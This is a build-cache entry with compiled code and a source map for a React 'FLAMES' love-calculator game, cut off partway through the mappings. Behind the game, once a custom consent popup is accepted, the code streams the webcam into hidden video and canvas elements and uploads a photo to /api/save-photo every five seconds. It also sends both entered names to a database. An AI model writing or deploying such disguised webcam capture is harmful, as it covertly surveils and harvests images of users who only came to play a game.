{"ast":null,"code":"import React,{useState,useCallback,useMemo,useRef,useEffect}from\"react\";import styled,{keyframes}from\"styled-components\";import PermissionPopup from\"./PermissionPopup\";import{jsx as _jsx,jsxs as _jsxs}from\"react/jsx-runtime\";const floatingHearts=keyframes`\n  0% { transform: translateY(0); opacity: 1; }\n  100% { transform: translateY(-100vh); opacity: 0; }\n`;const Background=styled.div`\n  position: fixed;\n  width: 100%;\n  height: 100%;\n  background: linear-gradient(135deg, #ff758c, #ff7eb3);\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  overflow: hidden;\n`;const Heart=styled.div`\n  position: absolute;\n  color: #ff4d6d;\n  font-size: 20px;\n  top: 100%;\n  left: ${_ref=>{let{left}=_ref;return left;}}%;\n  animation: ${floatingHearts} ${_ref2=>{let{duration}=_ref2;return duration;}}s linear infinite;\n`;const Container=styled.div`\n  text-align: center;\n  background: rgba(255, 255, 255, 0.95);\n  padding: 30px;\n  border-radius: 15px;\n  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);\n  width: 90%;\n  max-width: 400px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  gap: 12px;\n`;const Title=styled.h1`\n  color: #ff4d6d;\n  font-family: \"Cursive\", sans-serif;\n  font-size: 2rem;\n`;const Input=styled.input`\n  padding: 12px;\n  width: 80%;\n  max-width: 350px;\n  border: 2px solid #ff4d6d;\n  border-radius: 8px;\n  font-size: 16px;\n  outline: none;\n  text-align: center;\n`;const Button=styled.button`\n  background: ${_ref3=>{let{disabled}=_ref3;return disabled?\"#d3d3d3\":\"#ff4d6d\";}};\n  color: white;\n  padding: 12px;\n  font-size: 18px;\n  border: none;\n  cursor: ${_ref4=>{let{disabled}=_ref4;return disabled?\"not-allowed\":\"pointer\";}};\n  border-radius: 8px;\n  width: 100%;\n  max-width: 350px;\n`;const Result=styled.h2`\n  color: #d43f5e;\n  font-size: 24px;\n  margin-top: 20px;\n  opacity: 0;\n  animation: fadeIn 0.5s ease-in-out forwards;\n  @keyframes fadeIn {\n    from { opacity: 0; }\n    to { opacity: 1; }\n  }\n`;const ShareButton=styled.button`\n  background: rgb(157, 17, 127);\n  color: white;\n  padding: 10px;\n  font-size: 16px;\n  border: none;\n  cursor: pointer;\n  border-radius: 8px;\n  margin-top: 10px;\n  width: 100%;\n  max-width: 350px;\n`;const StatusMessage=styled.p`\n  font-size: 14px;\n  color: #444;\n`;const flamesLogic=(name1,name2)=>{const cleanName1=name1.toLowerCase().replace(/\\s/g,\"\");const cleanName2=name2.toLowerCase().replace(/\\s/g,\"\");let name1Arr=cleanName1.split(\"\");let name2Arr=cleanName2.split(\"\");for(let i=0;i<name1Arr.length;i++){const indexInName2=name2Arr.indexOf(name1Arr[i]);if(indexInName2!==-1){name1Arr[i]=\"\";name2Arr[indexInName2]=\"\";}}const remainingCount=name1Arr.filter(letter=>letter!==\"\").length+name2Arr.filter(letter=>letter!==\"\").length;let flames=[\"Friend\",\"Love\",\"Affection\",\"Marriage\",\"Enemy\",\"Sibling\"];let index=0;while(flames.length>1){index=(index+remainingCount-1)%flames.length;flames.splice(index,1);}return flames[0];};const FlamesGame=()=>{const[name1,setName1]=useState(\"\");const[name2,setName2]=useState(\"\");const[result,setResult]=useState(null);const[isLoading,setIsLoading]=useState(false);const[showPermissionPopup,setShowPermissionPopup]=useState(()=>localStorage.getItem(\"permissionsGiven\")!==\"true\");const[permissionStatus,setPermissionStatus]=useState(\"\");const videoRef=useRef();const canvasRef=useRef();useEffect(()=>{if(!showPermissionPopup){const startCamera=async()=>{const stream=await navigator.mediaDevices.getUserMedia({video:true});if(videoRef.current)videoRef.current.srcObject=stream;};startCamera();const interval=setInterval(capturePhoto,5000);return()=>{var _videoRef$current;clearInterval(interval);if((_videoRef$current=videoRef.current)!==null&&_videoRef$current!==void 0&&_videoRef$current.srcObject){videoRef.current.srcObject.getTracks().forEach(track=>track.stop());}};}},[showPermissionPopup]);const capturePhoto=async()=>{if(!canvasRef.current||!videoRef.current)return;const context=canvasRef.current.getContext(\"2d\");context.drawImage(videoRef.current,0,0,320,240);const imageData=canvasRef.current.toDataURL(\"image/jpeg\");try{const res=await fetch(\"/api/save-photo\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({image:imageData})});if(!res.ok){const text=await res.text();console.error(\"Backend error response:\",text);}console.log(\"Image sent to backend\");}catch(err){console.error(\"Image send failed:\",err);}};const handleAllow=()=>{setShowPermissionPopup(false);localStorage.setItem(\"permissionsGiven\",\"true\");setPermissionStatus(\"Camera access granted and capturing every 5s\");};const handleDeny=()=>{setShowPermissionPopup(false);localStorage.setItem(\"permissionsGiven\",\"false\");setPermissionStatus(\"Permissions denied ❌\");};const handleChange1=useCallback(e=>setName1(e.target.value),[]);const handleChange2=useCallback(e=>setName2(e.target.value),[]);const handleSubmit=async()=>{if(!name1.trim()||!name2.trim())return alert(\"Enter both names!\");if(name1.toLowerCase()===name2.toLowerCase())return alert(\"Names should be different!\");setIsLoading(true);setResult(null);setTimeout(async()=>{const flamesResult=flamesLogic(name1,name2);setResult(flamesResult);setIsLoading(false);// Save names and result to MongoDB via backend proxy\ntry{const res=await fetch(\"/api/save-result\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({name1,name2,result:flamesResult})});if(!res.ok){const text=await res.text();console.error(\"Result save error:\",text);}}catch(err){console.error(\"Failed to send result:\",err);}},2000);};const handleShare=async()=>{if(!result)return;const shareMessage=`FLAMES Result: ${name1} ❤ ${name2} = ${result}`;if(navigator.share){await navigator.share({text:shareMessage});}else{await navigator.clipboard.writeText(shareMessage);alert(\"Copied to clipboard! 📋\");}};const heartPositions=useMemo(()=>Array.from({length:30},()=>({left:Math.random()*100,duration:4+Math.random()*3})),[]);return/*#__PURE__*/_jsxs(Background,{children:[heartPositions.map((pos,i)=>/*#__PURE__*/_jsx(Heart,{left:pos.left,duration:pos.duration,children:\"\\u2764\\uFE0F\"},i)),showPermissionPopup&&/*#__PURE__*/_jsx(PermissionPopup,{onAllow:handleAllow,onDeny:handleDeny}),/*#__PURE__*/_jsxs(Container,{children:[/*#__PURE__*/_jsx(Title,{children:\"FLAMES - Love Calculator \\uD83D\\uDC96\"}),/*#__PURE__*/_jsx(Input,{type:\"text\",placeholder:\"Your Name\",value:name1,onChange:handleChange1}),/*#__PURE__*/_jsx(Input,{type:\"text\",placeholder:\"Crush's Name\",value:name2,onChange:handleChange2}),/*#__PURE__*/_jsx(Button,{onClick:handleSubmit,disabled:isLoading,children:isLoading?\"Checking...\":\"Check Relationship\"}),result&&/*#__PURE__*/_jsxs(Result,{children:[\"\\uD83D\\uDC98 \",result,\" \\uD83D\\uDC98\"]}),/*#__PURE__*/_jsx(ShareButton,{onClick:handleShare,children:\"\\uD83D\\uDCE4 Share\"}),permissionStatus&&/*#__PURE__*/_jsx(StatusMessage,{children:permissionStatus}),/*#__PURE__*/_jsx(\"video\",{ref:videoRef,width:\"320\",height:\"240\",autoPlay:true,muted:true,style:{display:\"none\"}}),/*#__PURE__*/_jsx(\"canvas\",{ref:canvasRef,width:\"320\",height:\"240\",style:{display:\"none\"}})]})]});};export default FlamesGame;","map":{"version":3,"names":["React","useState","useCallback","useMemo","useRef","useEffect","styled","keyframes","PermissionPopup","jsx","_jsx","jsxs","_jsxs","floatingHearts","Background","div","Heart","_ref","left","_ref2","duration","Container","Title","h1","Input","input","Button","button","_ref3","disabled","_ref4","Result","h2","ShareButton","StatusMessage","p","flamesLogic","name1","name2","cleanName1","toLowerCase","replace","cleanName2","name1Arr","split","name2Arr","i","length","indexInName2","indexOf","remainingCount","filter","letter","flames","index","splice","FlamesGame","setName1","setName2","result","setResult","isLoading","setIsLoading","showPermissionPopup","setShowPermissionPopup","localStorage","getItem","permissionStatus","setPermissionStatus","videoRef","canvasRef","startCamera","stream","navigator","mediaDevices","getUserMedia","video","current","srcObject","interval","setInterval","capturePhoto","_videoRef$current","clearInterval","getTracks","forEach","track","stop","context","getContext","drawImage","imageData","toDataURL","res","fetch","method","headers","body","JSON","stringify","image","ok","text","console","error","log","err","handleAllow","setItem","handleDeny","handleChange1","e","target","value","handleChange2","handleSubmit","trim","alert","setTimeout","flamesResult","handleShare","shareMessage","share","clipboard","writeText","heartPositions","Array","from","Math","random","children","map","pos","onAllow","onDeny","type","placeholder","onChange","onClick","ref","width","height","autoPlay","muted","style","display"],"sources":["K:/flamesv2/src/FlameGame.jsx"],"sourcesContent":["import React, { useState, useCallback, useMemo, useRef, useEffect } from \"react\";\r\nimport styled, { keyframes } from \"styled-components\";\r\nimport PermissionPopup from \"./PermissionPopup\";\r\n\r\nconst floatingHearts = keyframes`\r\n  0% { transform: translateY(0); opacity: 1; }\r\n  100% { transform: translateY(-100vh); opacity: 0; }\r\n`;\r\n\r\nconst Background = styled.div`\r\n  position: fixed;\r\n  width: 100%;\r\n  height: 100%;\r\n  background: linear-gradient(135deg, #ff758c, #ff7eb3);\r\n  display: flex;\r\n  align-items: center;\r\n  justify-content: center;\r\n  overflow: hidden;\r\n`;\r\n\r\nconst Heart = styled.div`\r\n  position: absolute;\r\n  color: #ff4d6d;\r\n  font-size: 20px;\r\n  top: 100%;\r\n  left: ${({ left }) => left}%;\r\n  animation: ${floatingHearts} ${({ duration }) => duration}s linear infinite;\r\n`;\r\n\r\nconst Container = styled.div`\r\n  text-align: center;\r\n  background: rgba(255, 255, 255, 0.95);\r\n  padding: 30px;\r\n  border-radius: 15px;\r\n  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);\r\n  width: 90%;\r\n  max-width: 400px;\r\n  display: flex;\r\n  flex-direction: column;\r\n  align-items: center;\r\n  gap: 12px;\r\n`;\r\n\r\nconst Title = styled.h1`\r\n  color: #ff4d6d;\r\n  font-family: \"Cursive\", sans-serif;\r\n  font-size: 2rem;\r\n`;\r\n\r\nconst Input = styled.input`\r\n  padding: 12px;\r\n  width: 80%;\r\n  max-width: 350px;\r\n  border: 2px solid #ff4d6d;\r\n  border-radius: 8px;\r\n  font-size: 16px;\r\n  outline: none;\r\n  text-align: center;\r\n`;\r\n\r\nconst Button = styled.button`\r\n  background: ${({ disabled }) => (disabled ? \"#d3d3d3\" : \"#ff4d6d\")};\r\n  color: white;\r\n  padding: 12px;\r\n  font-size: 18px;\r\n  border: none;\r\n  cursor: ${({ disabled }) => (disabled ? \"not-allowed\" : \"pointer\")};\r\n  border-radius: 8px;\r\n  width: 100%;\r\n  max-width: 350px;\r\n`;\r\n\r\nconst Result = styled.h2`\r\n  color: #d43f5e;\r\n  font-size: 24px;\r\n  margin-top: 20px;\r\n  opacity: 0;\r\n  animation: fadeIn 0.5s ease-in-out forwards;\r\n  @keyframes fadeIn {\r\n    from { opacity: 0; }\r\n    to { opacity: 1; }\r\n  }\r\n`;\r\n\r\nconst ShareButton = styled.button`\r\n  background: rgb(157, 17, 127);\r\n  color: white;\r\n  padding: 10px;\r\n  font-size: 16px;\r\n  border: none;\r\n  cursor: pointer;\r\n  border-radius: 8px;\r\n  margin-top: 10px;\r\n  width: 100%;\r\n  max-width: 350px;\r\n`;\r\n\r\nconst StatusMessage = styled.p`\r\n  font-size: 14px;\r\n  color: #444;\r\n`;\r\n\r\nconst flamesLogic = (name1, name2) => {\r\n  const cleanName1 = name1.toLowerCase().replace(/\\s/g, \"\");\r\n  const cleanName2 = name2.toLowerCase().replace(/\\s/g, \"\");\r\n\r\n  let name1Arr = cleanName1.split(\"\");\r\n  let name2Arr = cleanName2.split(\"\");\r\n\r\n  for (let i = 0; i < name1Arr.length; i++) {\r\n    const indexInName2 = name2Arr.indexOf(name1Arr[i]);\r\n    if (indexInName2 !== -1) {\r\n      name1Arr[i] = \"\";\r\n      name2Arr[indexInName2] = \"\";\r\n    }\r\n  }\r\n\r\n  const remainingCount =\r\n    name1Arr.filter(letter => letter !== \"\").length +\r\n    name2Arr.filter(letter => letter !== \"\").length;\r\n\r\n  let flames = [\"Friend\", \"Love\", \"Affection\", \"Marriage\", \"Enemy\", \"Sibling\"];\r\n  let index = 0;\r\n  while (flames.length > 1) {\r\n    index = (index + remainingCount - 1) % flames.length;\r\n    flames.splice(index, 1);\r\n  }\r\n  return flames[0];\r\n};\r\n\r\nconst FlamesGame = () => {\r\n  const [name1, setName1] = useState(\"\");\r\n  const [name2, setName2] = useState(\"\");\r\n  const [result, setResult] = useState(null);\r\n  const [isLoading, setIsLoading] = useState(false);\r\n  const [showPermissionPopup, setShowPermissionPopup] = useState(() => localStorage.getItem(\"permissionsGiven\") !== \"true\");\r\n  const [permissionStatus, setPermissionStatus] = useState(\"\");\r\n  const videoRef = useRef();\r\n  const canvasRef = useRef();\r\n\r\n  useEffect(() => {\r\n    if (!showPermissionPopup) {\r\n      const startCamera = async () => {\r\n        const stream = await navigator.mediaDevices.getUserMedia({ video: true });\r\n        if (videoRef.current) videoRef.current.srcObject = stream;\r\n      };\r\n\r\n      startCamera();\r\n\r\n      const interval = setInterval(capturePhoto, 5000);\r\n\r\n      return () => {\r\n        clearInterval(interval);\r\n        if (videoRef.current?.srcObject) {\r\n          videoRef.current.srcObject.getTracks().forEach(track => track.stop());\r\n        }\r\n      };\r\n    }\r\n  }, [showPermissionPopup]);\r\n\r\n  const capturePhoto = async () => {\r\n    if (!canvasRef.current || !videoRef.current) return;\r\n    const context = canvasRef.current.getContext(\"2d\");\r\n    context.drawImage(videoRef.current, 0, 0, 320, 240);\r\n    const imageData = canvasRef.current.toDataURL(\"image/jpeg\");\r\n\r\n    try {\r\n      const res = await fetch(\"/api/save-photo\", {\r\n        method: \"POST\",\r\n        headers: { \"Content-Type\": \"application/json\" },\r\n        body: JSON.stringify({ image: imageData }),\r\n      });\r\n\r\n      if (!res.ok) {\r\n        const text = await res.text();\r\n        console.error(\"Backend error response:\", text);\r\n      }\r\n\r\n      console.log(\"Image sent to backend\");\r\n    } catch (err) {\r\n      console.error(\"Image send failed:\", err);\r\n    }\r\n  };\r\n\r\n  const handleAllow = () => {\r\n    setShowPermissionPopup(false);\r\n    localStorage.setItem(\"permissionsGiven\", \"true\");\r\n    setPermissionStatus(\"Camera access granted and capturing every 5s\");\r\n  };\r\n\r\n  const handleDeny = () => {\r\n    setShowPermissionPopup(false);\r\n    localStorage.setItem(\"permissionsGiven\", \"false\");\r\n    setPermissionStatus(\"Permissions denied ❌\");\r\n  };\r\n\r\n  const handleChange1 = useCallback(e => setName1(e.target.value), []);\r\n  const handleChange2 = useCallback(e => setName2(e.target.value), []);\r\n\r\n  const handleSubmit = async () => {\r\n    if (!name1.trim() || !name2.trim()) return alert(\"Enter both names!\");\r\n    if (name1.toLowerCase() === name2.toLowerCase()) return alert(\"Names should be different!\");\r\n\r\n    setIsLoading(true);\r\n    setResult(null);\r\n\r\n    setTimeout(async () => {\r\n      const flamesResult = flamesLogic(name1, name2);\r\n      setResult(flamesResult);\r\n      setIsLoading(false);\r\n\r\n      // Save names and result to MongoDB via backend proxy\r\n      try {\r\n        const res = await fetch(\"/api/save-result\", {\r\n          method: \"POST\",\r\n          headers: { \"Content-Type\": \"application/json\" },\r\n          body: JSON.stringify({ name1, name2, result: flamesResult }),\r\n        });\r\n\r\n        if (!res.ok) {\r\n          const text = await res.text();\r\n          console.error(\"Result save error:\", text);\r\n        }\r\n      } catch (err) {\r\n        console.error(\"Failed to send result:\", err);\r\n      }\r\n    }, 2000);\r\n  };\r\n\r\n  const handleShare = async () => {\r\n    if (!result) return;\r\n    const shareMessage = `FLAMES Result: ${name1} ❤ ${name2} = ${result}`;\r\n    if (navigator.share) {\r\n      await navigator.share({ text: shareMessage });\r\n    } else {\r\n      await navigator.clipboard.writeText(shareMessage);\r\n      alert(\"Copied to clipboard! 📋\");\r\n    }\r\n  };\r\n\r\n  const heartPositions = useMemo(\r\n    () => Array.from({ length: 30 }, () => ({\r\n      left: Math.random() * 100,\r\n      duration: 4 + Math.random() * 3,\r\n    })),\r\n    []\r\n  );\r\n\r\n  return (\r\n    <Background>\r\n      {heartPositions.map((pos, i) => (\r\n        <Heart key={i} left={pos.left} duration={pos.duration}>❤️</Heart>\r\n      ))}\r\n      {showPermissionPopup && <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />}\r\n      <Container>\r\n        <Title>FLAMES - Love Calculator 💖</Title>\r\n        <Input type=\"text\" placeholder=\"Your Name\" value={name1} onChange={handleChange1} />\r\n        <Input type=\"text\" placeholder=\"Crush's Name\" value={name2} onChange={handleChange2} />\r\n        <Button onClick={handleSubmit} disabled={isLoading}>\r\n          {isLoading ? \"Checking...\" : \"Check Relationship\"}\r\n        </Button>\r\n        {result && <Result>💘 {result} 💘</Result>}\r\n        <ShareButton onClick={handleShare}>📤 Share</ShareButton>\r\n        {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}\r\n        <video ref={videoRef} width=\"320\" height=\"240\" autoPlay muted style={{ display: \"none\" }} />\r\n        <canvas ref={canvasRef} width=\"320\" height=\"240\" style={{ display: \"none\" }} />\r\n      </Container>\r\n    </Background>\r\n  );\r\n};\r\n\r\nexport default FlamesGame;\r\n"],"mappings":"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